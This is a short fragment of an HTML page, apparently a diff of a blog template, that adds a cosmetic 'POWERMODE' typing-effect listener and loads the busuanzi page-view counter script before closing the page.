+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
